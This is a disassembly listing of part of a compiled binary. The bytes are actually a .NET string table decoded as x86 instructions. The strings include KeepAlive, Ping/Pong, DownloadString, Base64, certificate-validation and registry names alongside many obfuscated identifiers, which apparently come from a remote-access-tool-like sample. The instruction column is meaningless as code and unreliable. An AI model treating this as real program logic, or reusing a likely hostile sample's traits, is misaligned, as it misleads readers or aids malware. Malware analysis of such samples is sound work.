  408a6c:	6c                   	insb   (%dx),%es:(%edi)
  408a6d:	75 65                	jne    0x408ad4
  408a6f:	00 47 65             	add    %al,0x65(%edi)
  408a72:	74 56                	je     0x408aca
  408a74:	61                   	popa
  408a75:	6c                   	insb   (%dx),%es:(%edi)
  408a76:	75 65                	jne    0x408add
  408a78:	00 53 65             	add    %dl,0x65(%ebx)
  408a7b:	74 56                	je     0x408ad3
  408a7d:	61                   	popa
  408a7e:	6c                   	insb   (%dx),%es:(%edi)
  408a7f:	75 65                	jne    0x408ae6
  408a81:	00 67 65             	add    %ah,0x65(%edi)
  408a84:	74 5f                	je     0x408ae5
  408a86:	4b                   	dec    %ebx
  408a87:	65 65 70 41          	gs gs jo 0x408acc
  408a8b:	6c                   	insb   (%dx),%es:(%edi)
  408a8c:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408a93:	5f                   	pop    %edi
  408a94:	4b                   	dec    %ebx
  408a95:	65 65 70 41          	gs gs jo 0x408ada
  408a99:	6c                   	insb   (%dx),%es:(%edi)
  408a9a:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408aa1:	6f                   	outsl  %ds:(%esi),(%dx)
  408aa2:	76 65                	jbe    0x408b09
  408aa4:	00 57 43             	add    %dl,0x43(%edi)
  408aa7:	77 5a                	ja     0x408b03
  408aa9:	4c                   	dec    %esp
  408aaa:	61                   	popa
  408aab:	6c                   	insb   (%dx),%es:(%edi)
  408aac:	4f                   	dec    %edi
  408aad:	75 47                	jne    0x408af6
  408aaf:	61                   	popa
  408ab0:	77 65                	ja     0x408b17
  408ab2:	00 4c 55 4b          	add    %cl,0x4b(%ebp,%edx,2)
  408ab6:	5a                   	pop    %edx
  408ab7:	79 65                	jns    0x408b1e
  408ab9:	69 44 6e 58 7a 77 65 	imul   $0x65777a,0x58(%esi,%ebp,2),%eax
  408ac0:	00 
  408ac1:	73 65                	jae    0x408b28
  408ac3:	74 5f                	je     0x408b24
  408ac5:	42                   	inc    %edx
  408ac6:	6c                   	insb   (%dx),%es:(%edi)
  408ac7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ac8:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408acb:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408ad2:	5f                   	pop    %edi
  408ad3:	54                   	push   %esp
  408ad4:	6f                   	outsl  %ds:(%esi),(%dx)
  408ad5:	74 61                	je     0x408b38
  408ad7:	6c                   	insb   (%dx),%es:(%edi)
  408ad8:	53                   	push   %ebx
  408ad9:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408ae0:	5f                   	pop    %edi
  408ae1:	48                   	dec    %eax
  408ae2:	65 61                	gs popa
  408ae4:	64 65 72 53          	fs gs jb 0x408b3b
  408ae8:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408aef:	5f                   	pop    %edi
  408af0:	48                   	dec    %eax
  408af1:	65 61                	gs popa
  408af3:	64 65 72 53          	fs gs jb 0x408b4a
  408af7:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408afe:	5f                   	pop    %edi
  408aff:	53                   	push   %ebx
  408b00:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b02:	64 42                	fs inc %edx
  408b04:	75 66                	jne    0x408b6c
  408b06:	66 65 72 53          	data16 gs jb 0x408b5d
  408b0a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b11:	5f                   	pop    %edi
  408b12:	52                   	push   %edx
  408b13:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408b17:	76 65                	jbe    0x408b7e
  408b19:	42                   	inc    %edx
  408b1a:	75 66                	jne    0x408b82
  408b1c:	66 65 72 53          	data16 gs jb 0x408b73
  408b20:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b27:	5f                   	pop    %edi
  408b28:	4b                   	dec    %ebx
  408b29:	65 79 53             	gs jns 0x408b7f
  408b2c:	69 7a 65 00 68 47 55 	imul   $0x55476800,0x65(%edx),%edi
  408b33:	47                   	inc    %edi
  408b34:	47                   	inc    %edi
  408b35:	56                   	push   %esi
  408b36:	64 58                	fs pop %eax
  408b38:	47                   	inc    %edi
  408b39:	64 6b 43 66 00       	imul   $0x0,%fs:0x66(%ebx),%eax
  408b3e:	4b                   	dec    %ebx
  408b3f:	74 6a                	je     0x408bab
  408b41:	64 4d                	fs dec %ebp
  408b43:	63 4a 79             	arpl   %ecx,0x79(%edx)
  408b46:	45                   	inc    %ebp
  408b47:	66 00 74 50 61       	data16 add %dh,0x61(%eax,%edx,2)
  408b4c:	46                   	inc    %esi
  408b4d:	76 4b                	jbe    0x408b9a
  408b4f:	50                   	push   %eax
  408b50:	5a                   	pop    %edx
  408b51:	6a 64                	push   $0x64
  408b53:	66 4d                	dec    %bp
  408b55:	66 00 6d 49          	data16 add %ch,0x49(%ebp)
  408b59:	4e                   	dec    %esi
  408b5a:	6a 45                	push   $0x45
  408b5c:	59                   	pop    %ecx
  408b5d:	67 79 7a             	addr16 jns 0x408bda
  408b60:	50                   	push   %eax
  408b61:	6f                   	outsl  %ds:(%esi),(%dx)
  408b62:	6f                   	outsl  %ds:(%esi),(%dx)
  408b63:	59                   	pop    %ecx
  408b64:	63 4e 66             	arpl   %ecx,0x66(%esi)
  408b67:	00 42 75             	add    %al,0x75(%edx)
  408b6a:	63 42 78             	arpl   %eax,0x78(%edx)
  408b6d:	42                   	inc    %edx
  408b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  408b6f:	75 6e                	jne    0x408bdf
  408b71:	45                   	inc    %ebp
  408b72:	79 74                	jns    0x408be8
  408b74:	58                   	pop    %eax
  408b75:	4f                   	dec    %edi
  408b76:	66 00 52 73          	data16 add %dl,0x73(%edx)
  408b7a:	63 48 58             	arpl   %ecx,0x58(%eax)
  408b7d:	50                   	push   %eax
  408b7e:	64 6e                	outsb  %fs:(%esi),(%dx)
  408b80:	57                   	push   %edi
  408b81:	4f                   	dec    %edi
  408b82:	50                   	push   %eax
  408b83:	66 00 42 6e          	data16 add %al,0x6e(%edx)
  408b87:	55                   	push   %ebp
  408b88:	44                   	inc    %esp
  408b89:	43                   	inc    %ebx
  408b8a:	4b                   	dec    %ebx
  408b8b:	58                   	pop    %eax
  408b8c:	70 6f                	jo     0x408bfd
  408b8e:	57                   	push   %edi
  408b8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b90:	69 65 66 00 4e 4d 64 	imul   $0x644d4e00,0x66(%ebp),%esp
  408b97:	4d                   	dec    %ebp
  408b98:	77 73                	ja     0x408c0d
  408b9a:	66 61                	popaw
  408b9c:	48                   	dec    %eax
  408b9d:	6c                   	insb   (%dx),%es:(%edi)
  408b9e:	6b 69 66 00          	imul   $0x0,0x66(%ecx),%ebp
  408ba2:	75 4e                	jne    0x408bf2
  408ba4:	57                   	push   %edi
  408ba5:	4a                   	dec    %edx
  408ba6:	78 69                	js     0x408c11
  408ba8:	68 53 4e 79 5a       	push   $0x5a794e53
  408bad:	51                   	push   %ecx
  408bae:	6c                   	insb   (%dx),%es:(%edi)
  408baf:	66 00 64 78 77       	data16 add %ah,0x77(%eax,%edi,2)
  408bb4:	75 74                	jne    0x408c2a
  408bb6:	58                   	pop    %eax
  408bb7:	63 74 77 70          	arpl   %esi,0x70(%edi,%esi,2)
  408bbb:	66 00 55 52          	data16 add %dl,0x52(%ebp)
  408bbf:	66 48                	dec    %ax
  408bc1:	6b 68 72 65          	imul   $0x65,0x72(%eax),%ebp
  408bc5:	45                   	inc    %ebp
  408bc6:	73 66                	jae    0x408c2e
  408bc8:	00 72 4e             	add    %dh,0x4e(%edx)
  408bcb:	53                   	push   %ebx
  408bcc:	7a 74                	jp     0x408c42
  408bce:	71 76                	jno    0x408c46
  408bd0:	6c                   	insb   (%dx),%es:(%edi)
  408bd1:	6c                   	insb   (%dx),%es:(%edi)
  408bd2:	67 48                	addr16 dec %eax
  408bd4:	75 66                	jne    0x408c3c
  408bd6:	00 66 53             	add    %ah,0x53(%esi)
  408bd9:	67 4e                	addr16 dec %esi
  408bdb:	69 54 4c 55 72 44 77 	imul   $0x66774472,0x55(%esp,%ecx,2),%edx
  408be2:	66 
  408be3:	00 50 65             	add    %dl,0x65(%eax)
  408be6:	54                   	push   %esp
  408be7:	41                   	inc    %ecx
  408be8:	68 62 47 64 79       	push   $0x79644762
  408bed:	65 45                	gs inc %ebp
  408bef:	7a 66                	jp     0x408c57
  408bf1:	00 78 7a             	add    %bh,0x7a(%eax)
  408bf4:	6d                   	insl   (%dx),%es:(%edi)
  408bf5:	41                   	inc    %ecx
  408bf6:	55                   	push   %ebp
  408bf7:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf8:	51                   	push   %ecx
  408bf9:	66 71 53             	data16 jno 0x408c4f
  408bfc:	7a 66                	jp     0x408c64
  408bfe:	00 4b 47             	add    %cl,0x47(%ebx)
  408c01:	65 4e                	gs dec %esi
  408c03:	4a                   	dec    %edx
  408c04:	75 64                	jne    0x408c6a
  408c06:	55                   	push   %ebp
  408c07:	6d                   	insl   (%dx),%es:(%edi)
  408c08:	56                   	push   %esi
  408c09:	76 55                	jbe    0x408c60
  408c0b:	4b                   	dec    %ebx
  408c0c:	67 00 5a 78          	add    %bl,0x78(%bp,%si)
  408c10:	4c                   	dec    %esp
  408c11:	6b 69 6b 4f          	imul   $0x4f,0x6b(%ecx),%ebp
  408c15:	70 70                	jo     0x408c87
  408c17:	4a                   	dec    %edx
  408c18:	63 67 00             	arpl   %esp,0x0(%edi)
  408c1b:	43                   	inc    %ebx
  408c1c:	72 79                	jb     0x408c97
  408c1e:	70 74                	jo     0x408c94
  408c20:	6f                   	outsl  %ds:(%esi),(%dx)
  408c21:	43                   	inc    %ebx
  408c22:	6f                   	outsl  %ds:(%esi),(%dx)
  408c23:	6e                   	outsb  %ds:(%esi),(%dx)
  408c24:	66 69 67 00 64 6a    	imul   $0x6a64,0x0(%edi),%sp
  408c2a:	4d                   	dec    %ebp
  408c2b:	49                   	dec    %ecx
  408c2c:	70 56                	jo     0x408c84
  408c2e:	65 71 4d             	gs jno 0x408c7e
  408c31:	6c                   	insb   (%dx),%es:(%edi)
  408c32:	67 00 67 65          	add    %ah,0x65(%bx)
  408c36:	74 5f                	je     0x408c97
  408c38:	50                   	push   %eax
  408c39:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c40:	5f                   	pop    %edi
  408c41:	50                   	push   %eax
  408c42:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c49:	74 65                	je     0x408cb0
  408c4b:	6d                   	insl   (%dx),%es:(%edi)
  408c4c:	2e 54                	cs push %esp
  408c4e:	68 72 65 61 64       	push   $0x64616572
  408c53:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c5a:	5f                   	pop    %edi
  408c5b:	50                   	push   %eax
  408c5c:	61                   	popa
  408c5d:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408c64:	64 64 
  408c66:	5f                   	pop    %edi
  408c67:	53                   	push   %ebx
  408c68:	65 73 73             	gs jae 0x408cde
  408c6b:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c72:	6e                   	outsb  %ds:(%esi),(%dx)
  408c73:	67 00 55 54          	add    %dl,0x54(%di)
  408c77:	46                   	inc    %esi
  408c78:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408c7b:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408c7e:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c85:	74 65                	je     0x408cec
  408c87:	6d                   	insl   (%dx),%es:(%edi)
  408c88:	2e 44                	cs inc %esp
  408c8a:	72 61                	jb     0x408ced
  408c8c:	77 69                	ja     0x408cf7
  408c8e:	6e                   	outsb  %ds:(%esi),(%dx)
  408c8f:	67 2e 49             	addr16 cs dec %ecx
  408c92:	6d                   	insl   (%dx),%es:(%edi)
  408c93:	61                   	popa
  408c94:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408c9b:	73 
  408c9c:	74 65                	je     0x408d03
  408c9e:	6d                   	insl   (%dx),%es:(%edi)
  408c9f:	2e 52                	cs push %edx
  408ca1:	75 6e                	jne    0x408d11
  408ca3:	74 69                	je     0x408d0e
  408ca5:	6d                   	insl   (%dx),%es:(%edi)
  408ca6:	65 2e 56             	gs cs push %esi
  408ca9:	65 72 73             	gs jb  0x408d1f
  408cac:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408cb3:	46                   	inc    %esi
  408cb4:	72 6f                	jb     0x408d25
  408cb6:	6d                   	insl   (%dx),%es:(%edi)
  408cb7:	42                   	inc    %edx
  408cb8:	61                   	popa
  408cb9:	73 65                	jae    0x408d20
  408cbb:	36 34 53             	ss xor $0x53,%al
  408cbe:	74 72                	je     0x408d32
  408cc0:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408cc7:	61                   	popa
  408cc8:	73 65                	jae    0x408d2f
  408cca:	36 34 53             	ss xor $0x53,%al
  408ccd:	74 72                	je     0x408d41
  408ccf:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408cd6:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd7:	6c                   	insb   (%dx),%es:(%edi)
  408cd8:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd9:	61                   	popa
  408cda:	64 53                	fs push %ebx
  408cdc:	74 72                	je     0x408d50
  408cde:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408ce5:	74 72                	je     0x408d59
  408ce7:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408cee:	5f                   	pop    %edi
  408cef:	41                   	inc    %ecx
  408cf0:	73 53                	jae    0x408d45
  408cf2:	74 72                	je     0x408d66
  408cf4:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408cfb:	5f                   	pop    %edi
  408cfc:	41                   	inc    %ecx
  408cfd:	73 53                	jae    0x408d52
  408cff:	74 72                	je     0x408d73
  408d01:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408d08:	53                   	push   %ebx
  408d09:	74 72                	je     0x408d7d
  408d0b:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408d12:	73 74                	jae    0x408d88
  408d14:	72 69                	jb     0x408d7f
  408d16:	6e                   	outsb  %ds:(%esi),(%dx)
  408d17:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408d1b:	73 74                	jae    0x408d91
  408d1d:	65 6d                	gs insl (%dx),%es:(%edi)
  408d1f:	2e 44                	cs inc %esp
  408d21:	72 61                	jb     0x408d84
  408d23:	77 69                	ja     0x408d8e
  408d25:	6e                   	outsb  %ds:(%esi),(%dx)
  408d26:	67 00 67 65          	add    %ah,0x65(%bx)
  408d2a:	74 5f                	je     0x408d8b
  408d2c:	41                   	inc    %ecx
  408d2d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d31:	61                   	popa
  408d32:	74 65                	je     0x408d99
  408d34:	50                   	push   %eax
  408d35:	6f                   	outsl  %ds:(%esi),(%dx)
  408d36:	6e                   	outsb  %ds:(%esi),(%dx)
  408d37:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408d3b:	74 5f                	je     0x408d9c
  408d3d:	41                   	inc    %ecx
  408d3e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d42:	61                   	popa
  408d43:	74 65                	je     0x408daa
  408d45:	50                   	push   %eax
  408d46:	6f                   	outsl  %ds:(%esi),(%dx)
  408d47:	6e                   	outsb  %ds:(%esi),(%dx)
  408d48:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408d4c:	74 5f                	je     0x408dad
  408d4e:	45                   	inc    %ebp
  408d4f:	72 72                	jb     0x408dc3
  408d51:	6f                   	outsl  %ds:(%esi),(%dx)
  408d52:	72 44                	jb     0x408d98
  408d54:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408d5b:	58                   	pop    %eax
  408d5c:	47                   	inc    %edi
  408d5d:	4a                   	dec    %edx
  408d5e:	4a                   	dec    %edx
  408d5f:	77 46                	ja     0x408da7
  408d61:	49                   	dec    %ecx
  408d62:	52                   	push   %edx
  408d63:	68 4a 71 67 00       	push   $0x67714a
  408d68:	65 4c                	gs dec %esp
  408d6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d6b:	4e                   	dec    %esi
  408d6c:	44                   	inc    %esp
  408d6d:	4f                   	dec    %edi
  408d6e:	43                   	inc    %ebx
  408d6f:	56                   	push   %esi
  408d70:	47                   	inc    %edi
  408d71:	46                   	inc    %esi
  408d72:	68 00 47 78 73       	push   $0x73784700
  408d77:	71 56                	jno    0x408dcf
  408d79:	58                   	pop    %eax
  408d7a:	53                   	push   %ebx
  408d7b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7c:	54                   	push   %esp
  408d7d:	47                   	inc    %edi
  408d7e:	58                   	pop    %eax
  408d7f:	67 58                	addr16 pop %eax
  408d81:	48                   	dec    %eax
  408d82:	68 00 53 6f 63       	push   $0x636f5300
  408d87:	47                   	inc    %edi
  408d88:	77 53                	ja     0x408ddd
  408d8a:	71 51                	jno    0x408ddd
  408d8c:	64 57                	fs push %edi
  408d8e:	68 00 56 6d 7a       	push   $0x7a6d5600
  408d93:	77 58                	ja     0x408ded
  408d95:	49                   	dec    %ecx
  408d96:	57                   	push   %edi
  408d97:	6e                   	outsb  %ds:(%esi),(%dx)
  408d98:	62 5a 68             	bound  %ebx,0x68(%edx)
  408d9b:	00 43 6f             	add    %al,0x6f(%ebx)
  408d9e:	6d                   	insl   (%dx),%es:(%edi)
  408d9f:	70 75                	jo     0x408e16
  408da1:	74 65                	je     0x408e08
  408da3:	48                   	dec    %eax
  408da4:	61                   	popa
  408da5:	73 68                	jae    0x408e0f
  408da7:	00 56 65             	add    %dl,0x65(%esi)
  408daa:	72 69                	jb     0x408e15
  408dac:	66 79 48             	data16 jns 0x408df7
  408daf:	61                   	popa
  408db0:	73 68                	jae    0x408e1a
  408db2:	00 46 6c             	add    %al,0x6c(%esi)
  408db5:	75 73                	jne    0x408e2a
  408db7:	68 00 67 65 74       	push   $0x74656700
  408dbc:	5f                   	pop    %edi
  408dbd:	45                   	inc    %ebp
  408dbe:	78 65                	js     0x408e25
  408dc0:	63 75 74             	arpl   %esi,0x74(%ebp)
  408dc3:	61                   	popa
  408dc4:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408dc8:	61                   	popa
  408dc9:	74 68                	je     0x408e33
  408dcb:	00 47 65             	add    %al,0x65(%edi)
  408dce:	74 54                	je     0x408e24
  408dd0:	65 6d                	gs insl (%dx),%es:(%edi)
  408dd2:	70 50                	jo     0x408e24
  408dd4:	61                   	popa
  408dd5:	74 68                	je     0x408e3f
  408dd7:	00 67 65             	add    %ah,0x65(%edi)
  408dda:	74 5f                	je     0x408e3b
  408ddc:	4c                   	dec    %esp
  408ddd:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ddf:	67 74 68             	addr16 je 0x408e4a
  408de2:	00 48 71             	add    %cl,0x71(%eax)
  408de5:	75 65                	jne    0x408e4c
  408de7:	6c                   	insb   (%dx),%es:(%edi)
  408de8:	68 58 55 75 5a       	push   $0x5a755558
  408ded:	58                   	pop    %eax
  408dee:	79 68                	jns    0x408e58
  408df0:	00 6a 7a             	add    %ch,0x7a(%edx)
  408df3:	48                   	dec    %eax
  408df4:	48                   	dec    %eax
  408df5:	5a                   	pop    %edx
  408df6:	5a                   	pop    %edx
  408df7:	79 69                	jns    0x408e62
  408df9:	4c                   	dec    %esp
  408dfa:	48                   	dec    %eax
  408dfb:	44                   	inc    %esp
  408dfc:	69 00 43 42 76 5a    	imul   $0x5a764243,(%eax),%eax
  408e02:	66 4f                	dec    %di
  408e04:	72 70                	jb     0x408e76
  408e06:	41                   	inc    %ecx
  408e07:	54                   	push   %esp
  408e08:	6b 56 61 58          	imul   $0x58,0x61(%esi),%edx
  408e0c:	69 00 6b 4a 4f 56    	imul   $0x564f4a6b,(%eax),%eax
  408e12:	4c                   	dec    %esp
  408e13:	67 4b                	addr16 dec %ebx
  408e15:	41                   	inc    %ecx
  408e16:	62 48 6e             	bound  %ecx,0x6e(%eax)
  408e19:	74 62                	je     0x408e7d
  408e1b:	69 00 55 72 69 00    	imul   $0x697255,(%eax),%eax
  408e21:	54                   	push   %esp
  408e22:	74 58                	je     0x408e7c
  408e24:	77 66                	ja     0x408e8c
  408e26:	77 63                	ja     0x408e8b
  408e28:	49                   	dec    %ecx
  408e29:	4d                   	dec    %ebp
  408e2a:	48                   	dec    %eax
  408e2b:	45                   	inc    %ebp
  408e2c:	74 69                	je     0x408e97
  408e2e:	00 78 75             	add    %bh,0x75(%eax)
  408e31:	49                   	dec    %ecx
  408e32:	63 4b 54             	arpl   %ecx,0x54(%ebx)
  408e35:	55                   	push   %ebp
  408e36:	68 6d 5a 70 75       	push   $0x75705a6d
  408e3b:	69 00 54 56 44 4a    	imul   $0x4a445654,(%eax),%eax
  408e41:	74 69                	je     0x408eac
  408e43:	73 6c                	jae    0x408eb1
  408e45:	66 61                	popaw
  408e47:	68 79 69 00 57       	push   $0x57006979
  408e4c:	79 74                	jns    0x408ec2
  408e4e:	4b                   	dec    %ebx
  408e4f:	55                   	push   %ebp
  408e50:	47                   	inc    %edi
  408e51:	74 67                	je     0x408eba
  408e53:	46                   	inc    %esi
  408e54:	77 57                	ja     0x408ead
  408e56:	44                   	inc    %esp
  408e57:	6a 00                	push   $0x0
  408e59:	41                   	inc    %ecx
  408e5a:	4b                   	dec    %ebx
  408e5b:	78 70                	js     0x408ecd
  408e5d:	42                   	inc    %edx
  408e5e:	42                   	inc    %edx
  408e5f:	6d                   	insl   (%dx),%es:(%edi)
  408e60:	4a                   	dec    %edx
  408e61:	44                   	inc    %esp
  408e62:	4b                   	dec    %ebx
  408e63:	72 6f                	jb     0x408ed4
  408e65:	47                   	inc    %edi
  408e66:	6a 00                	push   $0x0
  408e68:	4f                   	dec    %edi
  408e69:	68 71 74 6e 54       	push   $0x546e7471
  408e6e:	4b                   	dec    %ebx
  408e6f:	4a                   	dec    %edx
  408e70:	4f                   	dec    %edi
  408e71:	6a 00                	push   $0x0
  408e73:	4d                   	dec    %ebp
  408e74:	57                   	push   %edi
  408e75:	64 44                	fs inc %esp
  408e77:	4f                   	dec    %edi
  408e78:	52                   	push   %edx
  408e79:	4e                   	dec    %esi
  408e7a:	52                   	push   %edx
  408e7b:	50                   	push   %eax
  408e7c:	47                   	inc    %edi
  408e7d:	73 6a                	jae    0x408ee9
  408e7f:	00 72 74             	add    %dh,0x74(%edx)
  408e82:	59                   	pop    %ecx
  408e83:	6c                   	insb   (%dx),%es:(%edi)
  408e84:	73 59                	jae    0x408edf
  408e86:	6f                   	outsl  %ds:(%esi),(%dx)
  408e87:	70 72                	jo     0x408efb
  408e89:	75 6a                	jne    0x408ef5
  408e8b:	00 47 54             	add    %al,0x54(%edi)
  408e8e:	4f                   	dec    %edi
  408e8f:	67 43                	addr16 inc %ebx
  408e91:	55                   	push   %ebp
  408e92:	78 74                	js     0x408f08
  408e94:	62 4a 6b             	bound  %ecx,0x6b(%edx)
  408e97:	00 41 67             	add    %al,0x67(%ecx)
  408e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  408e9b:	51                   	push   %ecx
  408e9c:	71 64                	jno    0x408f02
  408e9e:	6a 77                	push   $0x77
  408ea0:	69 42 6d 50 6b 00 6b 	imul   $0x6b006b50,0x6d(%edx),%eax
  408ea7:	61                   	popa
  408ea8:	78 6e                	js     0x408f18
  408eaa:	4b                   	dec    %ebx
  408eab:	6f                   	outsl  %ds:(%esi),(%dx)
  408eac:	49                   	dec    %ecx
  408ead:	6a 44                	push   $0x44
  408eaf:	57                   	push   %edi
  408eb0:	7a 74                	jp     0x408f26
  408eb2:	59                   	pop    %ecx
  408eb3:	6b 00 76             	imul   $0x76,(%eax),%eax
  408eb6:	68 58 50 70 4f       	push   $0x4f705058
  408ebb:	74 64                	je     0x408f21
  408ebd:	4e                   	dec    %esi
  408ebe:	61                   	popa
  408ebf:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  408ec2:	69 46 43 49 65 55 4f 	imul   $0x4f556549,0x43(%esi),%eax
  408ec9:	65 4e                	gs dec %esi
  408ecb:	62 6b 00             	bound  %ebp,0x0(%ebx)
  408ece:	41                   	inc    %ecx
  408ecf:	73 79                	jae    0x408f4a
  408ed1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ed2:	63 43 61             	arpl   %eax,0x61(%ebx)
  408ed5:	6c                   	insb   (%dx),%es:(%edi)
  408ed6:	6c                   	insb   (%dx),%es:(%edi)
  408ed7:	62 61 63             	bound  %esp,0x63(%ecx)
  408eda:	6b 00 52             	imul   $0x52,(%eax),%eax
  408edd:	65 6d                	gs insl (%dx),%es:(%edi)
  408edf:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee0:	74 65                	je     0x408f47
  408ee2:	43                   	inc    %ebx
  408ee3:	65 72 74             	gs jb  0x408f5a
  408ee6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408eed:	56                   	push   %esi
  408eee:	61                   	popa
  408eef:	6c                   	insb   (%dx),%es:(%edi)
  408ef0:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408ef7:	43 
  408ef8:	61                   	popa
  408ef9:	6c                   	insb   (%dx),%es:(%edi)
  408efa:	6c                   	insb   (%dx),%es:(%edi)
  408efb:	62 61 63             	bound  %esp,0x63(%ecx)
  408efe:	6b 00 54             	imul   $0x54,(%eax),%eax
  408f01:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408f08:	6c                   	insb   (%dx),%es:(%edi)
  408f09:	62 61 63             	bound  %esp,0x63(%ecx)
  408f0c:	6b 00 52             	imul   $0x52,(%eax),%eax
  408f0f:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408f16:	4b 65 
  408f18:	79 50                	jns    0x408f6a
  408f1a:	65 72 6d             	gs jb  0x408f8a
  408f1d:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408f24:	68 65 63 6b 00       	push   $0x6b6365
  408f29:	46                   	inc    %esi
  408f2a:	6c                   	insb   (%dx),%es:(%edi)
  408f2b:	75 73                	jne    0x408fa0
  408f2d:	68 46 69 6e 61       	push   $0x616e6946
  408f32:	6c                   	insb   (%dx),%es:(%edi)
  408f33:	42                   	inc    %edx
  408f34:	6c                   	insb   (%dx),%es:(%edi)
  408f35:	6f                   	outsl  %ds:(%esi),(%dx)
  408f36:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408f39:	78 6f                	js     0x408faa
  408f3b:	59                   	pop    %ecx
  408f3c:	61                   	popa
  408f3d:	68 51 50 49 70       	push   $0x70495051
  408f42:	4e                   	dec    %esi
  408f43:	4b                   	dec    %ebx
  408f44:	69 6b 00 44 50 72 68 	imul   $0x68725044,0x0(%ebx),%ebp
  408f4b:	56                   	push   %esi
  408f4c:	43                   	inc    %ebx
  408f4d:	74 51                	je     0x408fa0
  408f4f:	4b                   	dec    %ebx
  408f50:	52                   	push   %edx
  408f51:	49                   	dec    %ecx
  408f52:	62 64 6e 6b          	bound  %esp,0x6b(%esi,%ebp,2)
  408f56:	00 57 53             	add    %dl,0x53(%edi)
  408f59:	4a                   	dec    %edx
  408f5a:	50                   	push   %eax
  408f5b:	65 79 54             	gs jns 0x408fb2
  408f5e:	5a                   	pop    %edx
  408f5f:	41                   	inc    %ecx
  408f60:	68 59 75 6b 00       	push   $0x6b7559
  408f65:	4f                   	dec    %edi
  408f66:	6c                   	insb   (%dx),%es:(%edi)
  408f67:	63 6e 59             	arpl   %ebp,0x59(%esi)
  408f6a:	56                   	push   %esi
  408f6b:	75 51                	jne    0x408fbe
  408f6d:	6b 4f 52 52          	imul   $0x52,0x52(%edi),%ecx
  408f71:	78 6b                	js     0x408fde
  408f73:	00 44 69 7a          	add    %al,0x7a(%ecx,%ebp,2)
  408f77:	41                   	inc    %ecx
  408f78:	76 77                	jbe    0x408ff1
  408f7a:	70 79                	jo     0x408ff5
  408f7c:	6d                   	insl   (%dx),%es:(%edi)
  408f7d:	50                   	push   %eax
  408f7e:	79 6b                	jns    0x408feb
  408f80:	00 45 6b             	add    %al,0x6b(%ebp)
  408f83:	6c                   	insb   (%dx),%es:(%edi)
  408f84:	5a                   	pop    %edx
  408f85:	56                   	push   %esi
  408f86:	49                   	dec    %ecx
  408f87:	4e                   	dec    %esi
  408f88:	50                   	push   %eax
  408f89:	7a 59                	jp     0x408fe4
  408f8b:	76 68                	jbe    0x408ff5
  408f8d:	67 43                	addr16 inc %ebx
  408f8f:	6c                   	insb   (%dx),%es:(%edi)
  408f90:	00 72 51             	add    %dh,0x51(%edx)
  408f93:	62 72 64             	bound  %esi,0x64(%edx)
  408f96:	70 4e                	jo     0x408fe6
  408f98:	4d                   	dec    %ebp
  408f99:	4d                   	dec    %ebp
  408f9a:	4c                   	dec    %esp
  408f9b:	6c                   	insb   (%dx),%es:(%edi)
  408f9c:	00 7a 56             	add    %bh,0x56(%edx)
  408f9f:	5a                   	pop    %edx
